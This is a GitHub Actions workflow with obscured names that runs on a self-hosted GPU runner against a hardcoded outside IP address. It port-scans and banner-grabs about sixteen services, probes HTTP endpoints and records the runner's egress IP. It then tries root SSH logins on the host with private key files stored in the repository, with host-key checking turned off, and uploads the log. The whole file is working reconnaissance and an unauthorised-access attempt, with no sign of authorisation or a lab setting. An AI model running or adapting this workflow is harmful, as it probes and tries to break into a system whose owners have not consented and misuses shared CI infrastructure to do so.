name: ul7466d
on:
  workflow_dispatch:
    inputs:
      runtag:
        description: "tag"
        default: "scan"
permissions:
  contents: write
jobs:
  ex:
    runs-on: [self-hosted, ul-l40s]
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - name: scan
        env:
          TAG: ${{ inputs.runtag }}
        run: |
          set +e
          H=123.184.7.135
          L="vantage/gv5817/${TAG}_scan.log"
          mkdir -p vantage/gv5817
          {
          echo "=== $TAG $(date -u +%FT%TZ) host=$(hostname) egress=$(curl -s -m 8 https://api.ipify.org)"
          for p in 22 80 443 2375 3306 5432 6379 8000 8099 8888 9000 10250 11434 18080 18081 1963; do
            T=$(timeout 6 bash -c "exec 3<>/dev/tcp/$H/$p && echo OPEN" 2>/dev/null)
            if [ "$T" = OPEN ]; then
              B=$(timeout 6 bash -c "exec 3<>/dev/tcp/$H/$p; head -c 120 <&3" 2>/dev/null | tr -d '\r' | tr '\n' ' ')
              echo "PORT $p OPEN :: $B"
            else
              echo "PORT $p closed"
            fi
          done
          echo "== HTTP"
          for u in "http://$H/" "https://$H/" "http://$H:8000/" "http://$H:18080/" "http://$H:18081/" "http://$H:8099/"; do
            echo "-- $u"
            curl -s -k -m 8 -o /dev/null -w 'code=%{http_code} size=%{size_download}\n' "$u"
          done
          echo "== SSH keys"
          ls -la keys2/ 2>/dev/null | head
          for k in keys2/k04_ibm_key.pem_ keys2/k04_ibm_key.pem; do
            [ -f "$k" ] || continue
            echo "-- key $k"
            timeout 25 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o PreferredAuthentications=publickey root@$H 'id;hostname' 2>&1 | tail -5
          done
          echo "== SSH methods"
          timeout 20 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o PreferredAuthentications=none root@$H 2>&1 | tail -4
          } > "$L" 2>&1
          cat "$L"
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: ul7466d-${{ github.run_id }}
          path: vantage/gv5817/
          if-no-files-found: warn
